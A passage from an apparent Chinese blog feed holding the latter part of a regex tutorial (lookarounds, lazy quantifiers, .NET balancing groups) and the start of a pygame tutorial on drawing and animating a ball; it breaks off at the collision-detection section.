align="left">匹配exp,并捕获文本到名称为name的组里，也可以写成(?’name’exp)</td></tr><tr><td></td><td>(?:exp)</td><td align="left">匹配exp,不捕获匹配的文本，也不给此分组分配组号</td></tr><tr><td><strong>零宽断言</strong></td><td>(?&#x3D;exp)</td><td align="left">匹配exp前面的位置</td></tr><tr><td></td><td>(?&lt;&#x3D;exp)</td><td align="left">匹配exp后面的位置</td></tr><tr><td></td><td>(?!exp)</td><td align="left">匹配后面跟的不是exp的位置</td></tr><tr><td></td><td>(?&lt;!exp)</td><td align="left">匹配前面不是exp的位置</td></tr><tr><td><strong>注释</strong></td><td>(?#comment)</td><td align="left">这种类型的分组不对正则表达式的处理产生任何影响，用于提供注释让人阅读</td></tr></tbody></table><h1 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h1><blockquote><p>断言用来声明一个应该为真的事实。正则表达式中只有当断言为真时才会继续进行匹配。</p></blockquote><p>用于查找某些内容（但不包括这些内容）之前或之后的东西。</p><p>它们像<code>\b,^,$</code>那样用于指定一个位置，<strong>这个位置应该满足一定的条件</strong>(即断言)，因此它们也被称为零宽断言。</p><ul><li><strong>(?&#x3D;exp)<strong>也叫</strong>零宽度正预测先行断言</strong>。<ul><li>它断言自身<strong>出现的位置的后面</strong>能匹配表达式exp。比如<code>\b\w+(?=ing\b)</code>，匹配以ing结尾的单词的前面部分(除了ing以外的部分)，如查找I’m singing while you’re dancing.时，它会匹配sing和danc。</li></ul></li><li><strong>(?&lt;&#x3D;exp)<strong>也叫</strong>零宽度正回顾后发断言</strong>。<ul><li>它断言自身<strong>出现的位置的前面</strong>能匹配表达式exp。比如<code>(?&lt;=\bre)\w+\b</code>会匹配以re开头的单词的后半部分(除了re以外的部分)，例如在查找reading a book时，它匹配ading。</li></ul></li></ul><p>假如你想要给一个很长的数字中每三位间加一个逗号(当然是从右边加起了)，你可以这样查找需要在前面和里面添加逗号的部分：((?&lt;&#x3D;\d)\d{3})+\b，用它对1234567890进行查找时结果是234567890。</p><h1 id="负向零和断言"><a href="#负向零和断言" class="headerlink" title="负向零和断言"></a>负向零和断言</h1><p>如果我们只是想要<strong>确保某个字符没有出现，但并不想去匹配它</strong>时怎么办？</p><p>例如查找一个单词，出现了q，但q后不跟着u。</p><p>如果用前面的知识<code>\b\w*q[^u]\w*\b</code>匹配，一旦以q结尾（例如Iraq、Benq），表达式就会出错。因为<code>[^u]</code>总要匹配一个字符。</p><p>但负向零和断言可以解决这个问题，因为它只匹配一个位置，并不消费任何字符。</p><ul><li><strong>(?!exp)零宽度负预测先行断言</strong><ul><li>断言此位置的<strong>后面</strong>不能匹配表达式exp。</li><li>例如：<code>\d&#123;3&#125;(?!\d)</code>匹配三位数字，而且这三位数字的后面不能是数字；\b((?!abc)\w)+\b匹配不包含连续字符串abc的单词。</li></ul></li><li><strong>(?&lt;!exp)零宽度负回顾后发断言</strong><ul><li>断言此位置的<strong>前面</strong>不能匹配表达式exp。</li><li>例如：<code>(?&lt;![a-z])\d&#123;7&#125;</code>匹配前面不是小写字母的七位数字</li></ul></li></ul><p>一个更复杂的例子：<code>(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)</code>，匹配不包含属性的简单HTML标签内里的内容。例如<code>&lt;b&gt;aaaa&lt;/b&gt;</code>中的aaa。</p><h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><p>小括号的另一种用途是通过语法<code>(?#comment)</code>来<strong>包含注释</strong>。</p><p>例如：<code>2[0-4]\d(?#200-249)|25[0-5](?#250-255)|[01]?\d\d?(?#0-199)</code>。</p><p>要包含注释的话，最好是启用“忽略模式里的空白符”选项，这样在编写表达式时能任意的添加空格，Tab，换行，而实际使用时这些都将被忽略。</p><p>启用这个选项后，在#后面到这一行结束的所有文本都将被当成注释忽略掉。</p><p>例如：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(<span class="hljs-string">?&lt;</span>=    <span class="hljs-comment"># 断言要匹配的文本的前缀</span><br>&lt;(\w+)&gt; <span class="hljs-comment"># 查找尖括号括起来的内容</span><br><span class="hljs-comment"># (即HTML/XML标签)</span><br>)       <span class="hljs-comment"># 前缀结束</span><br>.*      <span class="hljs-comment"># 匹配任意文本</span><br>(<span class="hljs-string">?=</span>     <span class="hljs-comment"># 断言要匹配的文本的后缀</span><br>&lt;\/\<span class="hljs-number">1</span>&gt;  <span class="hljs-comment"># 查找尖括号括起来的内容</span><br><span class="hljs-comment"># 查找尖括号括起来的内容</span><br>)       <span class="hljs-comment"># 后缀结束</span><br></code></pre></td></tr></table></figure><h1 id="贪婪与懒惰"><a href="#贪婪与懒惰" class="headerlink" title="贪婪与懒惰"></a>贪婪与懒惰</h1><p>当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配<strong>尽可能多</strong>的字符。</p><p>例如：<code>a.*b</code>，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为<strong>贪婪匹配</strong>。</p><p>但有时，我们需要匹配尽量少的字符，也就是<strong>懒惰匹配</strong>。</p><p>前面给出的限定符都可以被转化为懒惰匹配模式，只要在它后面加上一个问号**?**。这样<code>.*?</code>就意味着匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复。</p><p>例如：<code>a.*?b</code>，去匹配aabbab，会匹配aab和ab（<u>aab</u>b<u>ab</u>）。</p><p>为什么第一个匹配的是aab而不是ab，因为正则表达式有一条规则，比懒惰／贪婪规则的优先级更高：<strong>最先开始的匹配拥有最高的优先权</strong>。</p><p><strong>懒惰限定符</strong>：</p><table><thead><tr><th>代码&#x2F;语法</th><th>说明</th></tr></thead><tbody><tr><td>*?</td><td>重复任意次，但尽可能少重复</td></tr><tr><td>+?</td><td>重复1次或更多次，但尽可能少重复</td></tr><tr><td>??</td><td>重复0次或1次，但尽可能少重复</td></tr><tr><td>{n,m}?</td><td>重复n到m次，但尽可能少重复</td></tr><tr><td>{n,}?</td><td>重复n次以上，但尽可能少重复</td></tr></tbody></table><h1 id="处理选项"><a href="#处理选项" class="headerlink" title="处理选项"></a>处理选项</h1><p><strong>.Net中常用的正则表达式选项</strong>：</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>IgnoreCase(忽略大小写)</td><td>匹配时不区分大小写。</td></tr><tr><td>Multiline(多行模式)</td><td>更改^和$的含义，使它们分别在任意一行的行首和行尾匹配，而不仅仅在整个字符串的开头和结尾匹配。(在此模式下,$的精确含意是:匹配\n之前的位置以及字符串结束前的位置.)</td></tr><tr><td>Singleline(单行模式)</td><td>更改.的含义，使它与每一个字符匹配（包括换行符\n）。</td></tr><tr><td>IgnorePatternWhitespace(忽略空白)</td><td>忽略表达式中的非转义空白并启用由#标记的注释。</td></tr><tr><td>ExplicitCapture(显式捕获)</td><td>仅捕获已被显式命名的组。</td></tr></tbody></table><p>多行模式和单行模式可以同时使用，因为它们并不相悖。</p><h1 id="平衡组-x2F-递归匹配"><a href="#平衡组-x2F-递归匹配" class="headerlink" title="平衡组&#x2F;递归匹配"></a>平衡组&#x2F;递归匹配</h1><blockquote><p>这里介绍的平衡组语法是由.Net Framework支持的；其它语言／库不一定支持这种功能，或者支持此功能但需要使用不同的语法。</p></blockquote><p>有时我们需要匹配像( 100 * ( 50 + 15 ) )这样的可嵌套的层次性结构，这时简单地使用(.+)则只会匹配到最左边的左括号和最右边的右括号之间的内容(这里我们讨论的是贪婪模式，懒惰模式也有下面的问题)。</p><p>假如原来的字符串里的左括号和右括号出现的次数不相等，比如( 5 &#x2F; ( 3 + 2 ) ) )，那我们的匹配结果里两者的个数也不会相等。</p><p>有没有办法在这样的字符串里匹配到最长的，配对的括号之间的内容呢？</p><p><strong>Q</strong>：如何把<code>xx &lt;aa &lt;bbb&gt; &lt;bbb&gt; aa&gt; yy</code>这样的字符串里，最长的配对的尖括号内的内容捕获出来？</p><p><strong>A</strong>：这里需要用到以下的语法构造：</p><ul><li><strong>(?’group’)</strong> 把捕获的内容命名为group,并压入堆栈(Stack)</li><li><strong>(?’-group’)</strong> 从堆栈上弹出最后压入堆栈的名为group的捕获内容，如果堆栈本来为空，则本分组的匹配失败</li><li><strong>(?(group)yes|no)</strong> 如果堆栈上存在以名为group的捕获内容的话，继续匹配yes部分的表达式，否则继续匹配no部分</li><li><strong>(?!)</strong> 零宽负向先行断言，由于没有后缀表达式，试图匹配总是失败</li></ul><p>我们需要做的是每碰到了左括号，就在压入一个”Open”。</p><p>每碰到一个右括号，就弹出一个。</p><p>到了最后就看看堆栈是否为空。</p><p>如果不为空那就证明左括号比右括号多，那匹配就应该失败。正则表达式引擎会进行回溯(放弃最前面或最后面的一些字符)，尽量使整个表达式得到匹配。</p><blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;                   #最外层的左括号<br>  [^&lt;&gt;]*            #它后面非括号的内容<br>  (<br>      (<br>        (?<span class="hljs-string">&#x27;Open&#x27;</span>&lt;)  #左括号，压入<span class="hljs-string">&quot;Open&quot;</span><br>        [^&lt;&gt;]*      #左括号后面的内容<br>      )+<br>      (<br>        (?<span class="hljs-string">&#x27;-Open&#x27;</span>&gt;) #右括号，弹出一个<span class="hljs-string">&quot;Open&quot;</span><br>        [^&lt;&gt;]*      #右括号后面的内容<br>      )+<br>  )*<br>  (?(Open)(?!))     #最外层的右括号前检查<br>                    #若还有未弹出的<span class="hljs-string">&quot;Open&quot;</span><br>                    #则匹配失败<br><br>&gt;                #最外层的右括号<br></code></pre></td></tr></table></figure></blockquote><p>平衡组的一个最常见的应用就是匹配HTML。下面这个例子可以匹配嵌套的<code>&lt;div&gt;</code>标签：<code>&lt;div[^&gt;]*&gt;[^&lt;&gt;]*(((?&#39;Open&#39;&lt;div[^&gt;]*&gt;)[^&lt;&gt;]*)+((?&#39;-Open&#39;&lt;/div&gt;)[^&lt;&gt;]*)+)*(?(Open)(?!))&lt;/div&gt;.</code></p><h1 id="尚未详细讨论的语法"><a href="#尚未详细讨论的语法" class="headerlink" title="尚未详细讨论的语法"></a>尚未详细讨论的语法</h1><p><a href="http://msdn.microsoft.com/zh-cn/library/az24scfc.aspx">关于正则表达式语言元素的MSDN在线文档</a></p><table><thead><tr><th>代码&#x2F;语法</th><th>说明</th></tr></thead><tbody><tr><td>\a</td><td>报警字符(打印它的效果是电脑嘀一声)</td></tr><tr><td>\b</td><td>通常是单词分界位置，但如果在字符类里使用代表退格</td></tr><tr><td>\t</td><td>制表符，Tab</td></tr><tr><td>\r</td><td>回车</td></tr><tr><td>\v</td><td>竖向制表符</td></tr><tr><td>\f</td><td>换页符</td></tr><tr><td>\n</td><td>换行符</td></tr><tr><td>\e</td><td>Escape</td></tr><tr><td>\0nn</td><td>ASCII代码中八进制代码为nn的字符</td></tr><tr><td>\xnn</td><td>ASCII代码中十六进制代码为nn的字符</td></tr><tr><td>\unnnn</td><td>Unicode代码中十六进制代码为nnnn的字符</td></tr><tr><td>\cN</td><td>ASCII控制字符。比如\cC代表Ctrl+C</td></tr><tr><td>\A</td><td>字符串开头(类似^，但不受处理多行选项的影响)</td></tr><tr><td>\Z</td><td>字符串结尾或行尾(不受处理多行选项的影响)</td></tr><tr><td>\z</td><td>字符串结尾(类似$，但不受处理多行选项的影响)</td></tr><tr><td>\G</td><td>当前搜索的开头</td></tr><tr><td>\p{name}</td><td>Unicode中命名为name的字符类，例如\p{IsGreek}</td></tr><tr><td>(?&gt;exp)</td><td>贪婪子表达式</td></tr><tr><td>(?<x>-<y>exp)</td><td>平衡组</td></tr><tr><td>(?im-nsx:exp)</td><td>在子表达式exp中改变处理选项</td></tr><tr><td>(?im-nsx)</td><td>为表达式后面的部分改变处理选项</td></tr><tr><td>(?(exp)yes|no)</td><td>把exp当作零宽正向先行断言，如果在这个位置能匹配，使用yes作为此组的表达式；否则使用no</td></tr><tr><td>(?(exp)yes)</td><td>同上，只是使用空表达式作为no</td></tr><tr><td>(?(name)yes|no)</td><td>如果命名为name的组捕获到了内容，使用yes作为表达式；否则使用no</td></tr><tr><td>(?(name)yes)</td><td>同上，只是使用空表达式作为no</td></tr></tbody></table><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1]: <a href="https://deerchao.cn/tutorials/regex/regex.htm#top">https://deerchao.cn/tutorials/regex/regex.htm#top</a>“正则表达式30分钟入门教程”</p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pygame-大球吃小球</title>
    <link href="/2023/10/12/2023/PYGAME%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%A4%A7%E7%90%83%E5%90%83%E5%B0%8F%E7%90%83%EF%BC%89/"/>
    <url>/2023/10/12/2023/PYGAME%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%A4%A7%E7%90%83%E5%90%83%E5%B0%8F%E7%90%83%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Pygame是一个开源的Python模块，专门用于多媒体应用（如电子游戏）的开发，其中包含对图像、声音、视频、事件、碰撞等的支持。Pygame建立在<a href="https://zh.wikipedia.org/wiki/SDL">SDL</a>的基础上，SDL是一套跨平台的多媒体开发库，用C语言实现，被广泛的应用于游戏、模拟器、播放器等的开发。而Pygame让游戏开发者不再被底层语言束缚，可以更多的关注游戏的功能和逻辑。</p></blockquote><p>安装：<code>pip install pygame</code></p><p><a href="https://www.pygame.org/docs/">pygame文档参考</a></p><h1 id="大球吃小球（学习）"><a href="#大球吃小球（学习）" class="headerlink" title="大球吃小球（学习）"></a>大球吃小球（学习）</h1><p><strong><a href="https://github.com/jackfrued/Python-100-Days/blob/master/Day01-15/10.%E5%9B%BE%E5%BD%A2%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%92%8C%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91.md">·参考</a></strong></p><p>要求：鼠标点击生成球、球们在一定范围内自动移动，碰壁后转向，大球可吞并小球</p><h2 id="游戏窗口"><a href="#游戏窗口" class="headerlink" title="游戏窗口"></a>游戏窗口</h2><p><strong>先绘制游戏窗口</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pygame<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#初始化导入的pygame中的模块</span><br>    pygame.init()<br>    <span class="hljs-comment">#初始化窗口大小</span><br>    screen = pygame.display.set_mode((<span class="hljs-number">800</span>,<span class="hljs-number">600</span>))<br>    <span class="hljs-comment">#标题</span><br>    pygame.display.set_caption(<span class="hljs-string">&#x27;大球吃小球&#x27;</span>)<br>    running = <span class="hljs-literal">True</span><br>    <span class="hljs-comment">#开启一个事件循环处理发生的事件</span><br>    <span class="hljs-keyword">while</span> running:<br>        <span class="hljs-comment">#从消息队列中获取事件并对事件进行处理</span><br>        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>            <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.QUIT:<br>                running = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="小球（绘制-amp-加载图片）"><a href="#小球（绘制-amp-加载图片）" class="headerlink" title="小球（绘制&amp;加载图片）"></a>小球（绘制&amp;加载图片）</h2><p>pygame中draw模块的函数可以在窗口上绘图，可以绘制的图形包括：线条、矩形、多边形、圆、椭圆、圆弧等。</p><p>默认单位为像素。</p><p>pgame中颜色用的是色光三原色表示法，即通过一个元组或列表来指定颜色的RGB值，每个值都在0~255之间。</p><p>刷新当前窗口（渲染窗口将绘制的图像呈现出来）：<code>pygame.display.flip()</code></p><p>现在，<strong>设置窗口为米白色</strong>，<strong>并且绘制一个浅绿色、半径30的圆</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pygame<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#初始化导入的pygame中的模块</span><br>    pygame.init()<br>    <span class="hljs-comment">#初始化窗口大小</span><br>    screen = pygame.display.set_mode((<span class="hljs-number">800</span>,<span class="hljs-number">600</span>))<br>    <span class="hljs-comment">#标题</span><br>    pygame.display.set_caption(<span class="hljs-string">&#x27;大球吃小球&#x27;</span>)<br>    <span class="hljs-comment">#设计窗口的背景色</span><br>    screen.fill((<span class="hljs-number">245</span>, <span class="hljs-number">245</span>, <span class="hljs-number">220</span>))<br>    <span class="hljs-comment">#绘制一个圆(参数分别是: 屏幕, 颜色, 圆心位置, 半径, 0表示填充圆)</span><br>    pygame.draw.circle(screen,(<span class="hljs-number">0</span>,<span class="hljs-number">250</span>,<span class="hljs-number">154</span>),(<span class="hljs-number">100</span>,<span class="hljs-number">100</span>),<span class="hljs-number">30</span>,<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#刷新当前窗口（渲染窗口将绘制的图像呈现出来）</span><br>    pygame.display.flip()<br>    running = <span class="hljs-literal">True</span><br>    <span class="hljs-comment">#开启一个事件循环处理发生的事件</span><br>    <span class="hljs-keyword">while</span> running:<br>        <span class="hljs-comment">#从消息队列中获取事件并对事件进行处理</span><br>        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>            <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.QUIT:<br>                running = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-12%20%E4%B8%8A%E5%8D%887.39.48.png" alt="截屏2023-10-12 上午7.39.48"></p><p>也可以使用image模块的函数加载小球图像，通过之前获得的窗口对象的<code>blit</code>方法渲染图像。</p><p><strong>加载一个网上下载的小球图片,设置大小为50*50</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pygame<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#初始化导入的pygame中的模块</span><br>    pygame.init()<br>    <span class="hljs-comment">#初始化窗口大小</span><br>    screen = pygame.display.set_mode((<span class="hljs-number">800</span>,<span class="hljs-number">600</span>))<br>    <span class="hljs-comment">#标题</span><br>    pygame.display.set_caption(<span class="hljs-string">&#x27;大球吃小球&#x27;</span>)<br>    <span class="hljs-comment">#设计窗口的背景色</span><br>    screen.fill((<span class="hljs-number">245</span>, <span class="hljs-number">245</span>, <span class="hljs-number">220</span>))<br>    <span class="hljs-comment"># #绘制一个圆(参数分别是: 屏幕, 颜色, 圆心位置, 半径, 0表示填充圆)</span><br>    <span class="hljs-comment"># pygame.draw.circle(screen,(0,250,154),(100,100),30,0)</span><br>    <span class="hljs-comment"># #刷新当前窗口（渲染窗口将绘制的图像呈现出来）</span><br>    <span class="hljs-comment"># pygame.display.flip()</span><br><br>    <span class="hljs-comment">#通过指定的文件名加载图像</span><br>    ball_image = pygame.image.load(<span class="hljs-string">&#x27;./ball.png&#x27;</span>)<br>    <span class="hljs-comment">#缩放图片</span><br>    <span class="hljs-comment">#scale(surface, size, dest_surface=None)</span><br>    ball_image = pygame.transform.scale(ball_image,(<span class="hljs-number">50</span>,<span class="hljs-number">50</span>))<br>    <span class="hljs-comment">#在窗口渲染图像(图像，位置）</span><br>    screen.blit(ball_image,(<span class="hljs-number">50</span>,<span class="hljs-number">50</span>))<br><br>    <span class="hljs-comment">#刷新当前窗口（渲染窗口将绘制的图像呈现出来）</span><br>    pygame.display.flip()<br>    running = <span class="hljs-literal">True</span><br>    <span class="hljs-comment">#开启一个事件循环处理发生的事件</span><br>    <span class="hljs-keyword">while</span> running:<br>        <span class="hljs-comment">#从消息队列中获取事件并对事件进行处理</span><br>        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>            <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.QUIT:<br>                running = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-12%20%E4%B8%8A%E5%8D%887.58.29.png" alt="截屏2023-10-12 上午7.58.29"></p><h2 id="运动"><a href="#运动" class="headerlink" title="运动"></a>运动</h2><p>现在要让<strong>小球动起来</strong>。</p><p>动画的原理是将一张张图片连续播放，帧数越高越流畅。</p><p>让小球动起来，可以将小球的坐标设置为变量，每过一定时间便修改坐标重新绘制，即可看到运动小球的效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pygame<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#初始化导入的pygame中的模块</span><br>    pygame.init()<br>    <span class="hljs-comment">#初始化窗口大小</span><br>    screen = pygame.display.set_mode((<span class="hljs-number">800</span>,<span class="hljs-number">600</span>))<br>    <span class="hljs-comment">#标题</span><br>    pygame.display.set_caption(<span class="hljs-string">&#x27;大球吃小球&#x27;</span>)<br>    <br>    <span class="hljs-comment">#小球的位置变量</span><br>    ball_x,ball_y = <span class="hljs-number">50</span>,<span class="hljs-number">50</span><br><br>    <span class="hljs-comment">#刷新当前窗口（渲染窗口将绘制的图像呈现出来）</span><br>    pygame.display.flip()<br>    running = <span class="hljs-literal">True</span><br>    <span class="hljs-comment">#开启一个事件循环处理发生的事件</span><br>    <span class="hljs-keyword">while</span> running:<br>        <span class="hljs-comment">#从消息队列中获取事件并对事件进行处理</span><br>        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>            <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.QUIT:<br>                running = <span class="hljs-literal">False</span><br>        <span class="hljs-comment"># 设计窗口的背景色</span><br>        screen.fill((<span class="hljs-number">245</span>, <span class="hljs-number">245</span>, <span class="hljs-number">220</span>))<br>        <span class="hljs-comment"># 绘制一个圆(参数分别是: 屏幕, 颜色, 圆心位置, 半径, 0表示填充圆)</span><br>        pygame.draw.circle(screen, (<span class="hljs-number">0</span>, <span class="hljs-number">250</span>, <span class="hljs-number">154</span>), (ball_x, ball_y), <span class="hljs-number">30</span>, <span class="hljs-number">0</span>)<br>        pygame.display.flip()<br>        <span class="hljs-comment">#每隔50毫秒就改变小球位置刷新</span><br>        pygame.time.delay(<span class="hljs-number">50</span>)<br>        ball_x,ball_y = ball_x+<span class="hljs-number">5</span>,ball_y+<span class="hljs-number">5</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>现在可以看见小球向右下方运动。</p><p>让<strong>图片小球运动</strong>也是同理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pygame<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#初始化导入的pygame中的模块</span><br>    pygame.init()<br>    <span class="hljs-comment">#初始化窗口大小</span><br>    screen = pygame.display.set_mode((<span class="hljs-number">800</span>,<span class="hljs-number">600</span>))<br>    <span class="hljs-comment">#标题</span><br>    pygame.display.set_caption(<span class="hljs-string">&#x27;大球吃小球&#x27;</span>)<br>    <span class="hljs-comment">#小球的位置变量</span><br>    ball_x,ball_y = <span class="hljs-number">50</span>,<span class="hljs-number">50</span><br>    <span class="hljs-comment"># #通过指定的文件名加载图像</span><br>    ball_image = pygame.image.load(<span class="hljs-string">&#x27;./ball.png&#x27;</span>)<br>    <span class="hljs-comment">#缩放图片</span><br>    ball_image = pygame.transform.scale(ball_image,(<span class="hljs-number">50</span>,<span class="hljs-number">50</span>))<br>    running = <span class="hljs-literal">True</span><br>    <span class="hljs-comment">#开启一个事件循环处理发生的事件</span><br>    <span class="hljs-keyword">while</span> running:<br>        <span class="hljs-comment">#从消息队列中获取事件并对事件进行处理</span><br>        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>            <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.QUIT:<br>                running = <span class="hljs-literal">False</span><br>        <span class="hljs-comment"># 设计窗口的背景色</span><br>        screen.fill((<span class="hljs-number">245</span>, <span class="hljs-number">245</span>, <span class="hljs-number">220</span>))<br>        <span class="hljs-comment">#在窗口渲染图像(图像，位置）</span><br>        screen.blit(ball_image,(ball_x,ball_y))<br>        pygame.display.flip()<br>        <span class="hljs-comment">#每隔50毫秒就改变小球位置刷新</span><br>        pygame.time.delay(<span class="hljs-number">50</span>)<br>        ball_x,ball_y = ball_x+<span class="hljs-number">5</span>,ball_y+<span class="hljs-number">5</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="碰撞检测"><a href="#碰撞检测" class="headerlink" 